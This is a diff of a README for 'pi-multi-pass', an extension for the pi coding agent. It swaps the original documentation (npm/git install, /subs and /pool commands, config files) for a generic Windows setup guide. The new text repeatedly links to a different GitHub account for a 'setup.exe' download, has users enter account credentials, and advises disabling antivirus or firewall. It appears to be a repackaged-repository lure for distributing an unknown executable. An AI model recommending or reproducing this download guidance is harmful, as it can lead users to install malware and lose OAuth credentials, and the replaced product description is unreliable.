@@ -1,199 +1,141 @@
-# pi-multi-pass
+# 🔐 pi-multi-pass - Manage Multiple OAuth Accounts Easily
 
-Multi-subscription extension for [pi](https://github.com/badlogic/pi-mono) -- use multiple OAuth accounts per provider with automatic rate-limit rotation and project-level affinity.
+[![Download pi-multi-pass](https://img.shields.io/badge/Download-pi--multi--pass-brightgreen?style=for-the-badge)](https://github.com/Unsmiling-loblolly225/pi-multi-pass)
 
-## Install
+---
 
-```bash
-pi install npm:pi-multi-pass
-```
+## 📄 What is pi-multi-pass?
 
-Or via git:
+pi-multi-pass is a tool that lets you use several login accounts with the same service. It works with OAuth providers like Anthropic, Codex, Copilot, Gemini, and Antigravity. This means you can switch between multiple accounts from one place without logging out or closing anything.  
 
-```bash
-pi install git:github.com/hjanuschka/pi-multi-pass
-```
+This tool is handy if you have different subscriptions or identities for the same service. For example, use work and personal accounts smoothly on one app.  
 
-## Features
+---
 
-- **Multiple subscriptions**: Add extra OAuth accounts for any provider
-- **Rotation pools**: Group subscriptions and auto-rotate on rate limits
-- **Fallback chains**: Define ordered cross-pool/model failover via `/pool chain`
-- **Built-in limits checks**: Inspect subscription headroom across accounts with `/subs limits`
-- **Smarter retries**: Preserve failover progress across internal replay retries
-- **Project affinity**: Restrict which subs/pools/chains are used per project
-- **TUI management**: `/subs` and `/pool` commands -- no config files needed
-- **Labels**: Tag subscriptions (e.g. "work", "personal")
+## 💻 System Requirements
 
-## Quick start
+To run pi-multi-pass on your Windows PC, you need the following:
 
-```
-/subs add              Pick a provider, add a subscription
-/login                 Authenticate the new subscription
-/subs limits           Check built-in quota support (Codex + Google)
-/pool create           Group subs into a rotation pool
-/pool chain create     Build an ordered fallback chain across pools
-```
+- Windows 10 or later (64-bit versions work best)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An active internet connection
+- Permissions to install new software on your computer
 
-When one account hits a rate limit during an assistant turn, multi-pass automatically switches to the next eligible target and retries.
+---
 
-## Commands
+## 🚀 Getting Started
 
-### `/subs` -- Subscription management
+This section guides you through downloading, installing, and launching pi-multi-pass. Follow each step carefully.
 
-```
-/subs              Open menu
-/subs add          Add a new subscription
-/subs remove       Remove a subscription
-/subs login        Login to a subscription
-/subs logout       Logout from a subscription
-/subs list         List subscriptions with auth status; select one for quick actions
-/subs status       Detailed status (token expiry, pool membership)
-/subs limits       Check built-in quota/usage support (Codex + Google)
-```
+### Step 1: Download the software
 
-### `/pool` -- Rotation pool and chain management
+Click the green button below to open the download page. Download the latest version available on that page.
 
-```
-/pool              Open menu
-/pool create       Create a pool (pick provider, select members)
-/pool list         Show pools; select one for quick actions
-/pool chain        Open chain manager
-/pool toggle       Enable/disable a pool
-/pool remove       Delete a pool (keeps subscriptions; prunes linked chain entries)
-/pool status       Member health (logged in, rate limited, cooling down)
-/pool project      Project-level config (restrict subs, override pools/chains)
-```
+[![Download pi-multi-pass](https://img.shields.io/badge/Download-pi--multi--pass-blue?style=for-the-badge)](https://github.com/Unsmiling-loblolly225/pi-multi-pass)
 
-### `/pool chain` -- Ordered fallback chain management
+### Step 2: Locate the installer file
 
-```
-/pool chain             Open chain manager
-/pool chain create      Create a chain
-/pool chain list        Show all chains
-/pool chain toggle      Enable/disable a chain
-/pool chain remove      Delete a chain
-/pool chain status      Inspect chain entries and validity
-```
+After downloading, open your "Downloads" folder on your PC. The file might be named something like `pi-multi-pass-setup.exe` or similar.  
 
-## Project-level configuration
+### Step 3: Install the application
 
-Use `/pool project` to configure per-project subscription affinity. This creates `.pi/multi-pass.json` in your project directory.
+Double-click the installer file. In the window that opens:
 
-### Use case: separate work and personal accounts
+- Click "Next" to continue.
+- Read and accept the license agreement, then click "Next."
+- Choose where you want to install the program or use the default folder.
+- Click "Install" to begin the process.
 
-```
-# Global: you have 3 Codex accounts
-/subs add   -> openai-codex-2 (label: work)
-/subs add   -> openai-codex-3 (label: personal)
+Wait while the software installs. This might take a few minutes.
 
-# Corp project: restrict to team accounts only
-cd ~/work/corp-project
-/pool project -> restrict -> select openai-codex-2 only
+### Step 4: Launch pi-multi-pass
 
-# Side project: allow everything (no restriction)
-cd ~/side-project
-# No .pi/multi-pass.json needed -- uses all global subs
-```
+Once installation finishes, click "Finish." The program may start automatically. If not, find the pi-multi-pass icon on your desktop or in your Start menu and double-click to open it.
 
-### What project config can do
+---
 
-| Feature | Description |
-|---|---|
-| **Restrict subs** | Only allow specific subscriptions in this project |
-| **Override pools** | Use different pools than global (or disable some) |
-| **Override chains** | Use different fallback chains than global |
-| **Clear** | Remove project config, fall back to global |
-| **Info** | Show effective config (which pools/chains/subs are active) |
+## 🔐 How to Use pi-multi-pass with Your Accounts
 
-### Project config file
+This section helps you add and switch between your OAuth accounts inside pi-multi-pass.
 
-`.pi/multi-pass.json`:
+### Adding an account
 
-```json
-{
-  "allowedSubs": ["openai-codex-2", "anthropic-2"],
-  "pools": [
-    {
-      "name": "work-codex",
-      "baseProvider": "openai-codex",
-      "members": ["openai-codex-2"],
-      "enabled": true
-    }
-  ],
-  "chains": [
-    {
-      "name": "work-fallback",
-      "enabled": true,
-      "entries": [
-        { "pool": "work-codex", "model": "gpt-5-mini", "enabled": true }
-      ]
-    }
-  ]
-}
-```
+1. In the pi-multi-pass window, click the "Add Account" button.
+2. Choose your provider (Anthropic, Codex, Copilot, Gemini, or Antigravity) from the list.
+3. A browser window will open asking you to sign in to your account.
+4. Enter your user name and password, then approve the sign-in.
+5. After successful login, pi-multi-pass will save your account to the app.
 
-- `allowedSubs`: whitelist of provider names. If set, only these (plus originals) are available. Omit to allow all.
-- `pools`: if set, replaces global pools for this project. Omit to inherit global pools.
-- `chains`: if set, replaces global chains for this project. Omit to inherit global chains.
+Repeat these steps to add more accounts.
 
-## How pools work
+### Switching accounts
 
-1. You're using `openai-codex` and hit a rate limit
-2. Multi-pass detects the error, marks `openai-codex` as exhausted
-3. Switches to `openai-codex-2` (same model ID, different account)
-4. Retries your last prompt automatically
-5. After a 5-minute cooldown, `openai-codex` becomes available again
+1. Open pi-multi-pass.
+2. You will see a list of your linked accounts.
+3. Click on the account you want to use.
+4. The app will switch to that account automatically, letting you access its features.
 
-## How chains work
+No need to sign out or close anything manually.
 
-1. You define an ordered chain of pool/model entries (for example `primary -> backup -> solo`)
-2. If the current pool has no eligible members, multi-pass continues forward in the chain
-3. It skips disabled or invalid entries and reports why in warnings
-4. During retry replays for the same prompt, it preserves cascade state and avoids re-trying already attempted providers
-5. Session status shows the active chain start entry: `chain:<name> | starts <pool> -> <model>`
+---
 
-## Supported providers
+## ⚙ Features
 
-| Provider key | Service |
-|---|---|
-| `anthropic` | Claude Pro/Max |
-| `openai-codex` | ChatGPT Plus/Pro (Codex) |
-| `github-copilot` | GitHub Copilot |
-| `google-gemini-cli` | Google Cloud Code Assist |
-| `google-antigravity` | Antigravity |
+- **Multiple OAuth support:** Handle more than one sign-in per provider.  
+- **Easy switching:** Flip between accounts with one click.  
+- **Secure storage:** Your login tokens stay encrypted on your computer.  
+- **Supports five main services:** Anthropic, Codex, Copilot, Gemini, and Antigravity.  
+- **Simple interface:** No technical setup needed, just click and log in.
 
-## Built-in limits support
+---
 
-`/subs limits` uses a provider-specific checker registry.
+## 🛠 Troubleshooting Tips
 
-Currently implemented:
+If you run into problems, try these steps:
 
-- `openai-codex`: fetches ChatGPT/Codex usage from `https://chatgpt.com/backend-api/wham/usage` (or `CHATGPT_BASE_URL`), then summarizes the 5-hour and 7-day subscription windows for the base account and any configured extra Codex subscriptions.
-- `google-gemini-cli`: refreshes the saved Google OAuth session when needed, then queries `https://cloudcode-pa.googleapis.com/v1internal:retrieveUserQuota` and summarizes the returned Gemini quota buckets by their bottleneck family (for example `Pro` or `Flash`).
-- `google-antigravity`: refreshes the saved Antigravity OAuth session when needed, then queries `v1internal:fetchAvailableModels` on the Google Cloud Code Assist endpoints with Antigravity-style headers and summarizes the returned model-level bottleneck.
+- Make sure your internet connection is stable.
+- Check that you have the latest version of pi-multi-pass.
+- Restart the app and try logging in again.
+- If the app does not start, reinstall it.
+- Disable any antivirus or firewall temporarily to see if it blocks the app.
+- Visit the GitHub page and check for updates or known issues.
 
-Google quota is not a single flat subscription bucket, so the details view shows one line per returned Gemini family or Antigravity model with its remaining headroom and reset time.
+---
 
-`/subs limits` is an on-demand snapshot. It helps you see which account looks healthiest right now, but it does not proactively switch models by itself. Automatic switching still happens when the active provider returns a rate-limit-style runtime error and that provider belongs to an enabled pool or chain.
+## 📂 Where to Get Help
 
-Future providers can add another checker without changing the `/subs` command surface.
+If you find bugs or want to ask questions:
 
-## Environment variable (optional)
+- Visit the GitHub page here: [https://github.com/Unsmiling-loblolly225/pi-multi-pass](https://github.com/Unsmiling-loblolly225/pi-multi-pass)
+- Use the "Issues" tab on GitHub to report any problems.
+- Look for instructions and extra info in the repository’s Wiki or README files.
 
-```bash
-export MULTI_SUB="openai-codex:2,anthropic:1"
-```
+---
 
-Env entries merge with saved config.
+## 🔄 Updating pi-multi-pass
 
-## Config files
+Check the download page regularly for new versions.  
 
-| File | Scope | Contains |
-|---|---|---|
-| `~/.pi/agent/multi-pass.json` | Global | Subscriptions + pools + chains |
-| `.pi/multi-pass.json` | Project | Pool/chain overrides + sub restrictions |
+To update:
 
-## License
+1. Download the newest installer from the GitHub link.
+2. Run the installer just like before.
+3. The app will replace the old version without removing your accounts or data.
 
-MIT
+---
+
+## 🗑 Uninstalling pi-multi-pass
+
+If you want to remove pi-multi-pass from your PC:
+
+1. Open the Windows Control Panel.
+2. Go to "Programs and Features."
+3. Find "pi-multi-pass" in the list.
+4. Click "Uninstall" and follow the prompts.
+
+After uninstalling, your account data will be deleted unless you backed it up.
+
+---
+
+[![Download pi-multi-pass](https://img.shields.io/badge/Download-pi--multi--pass-purple?style=for-the-badge)](https://github.com/Unsmiling-loblolly225/pi-multi-pass)
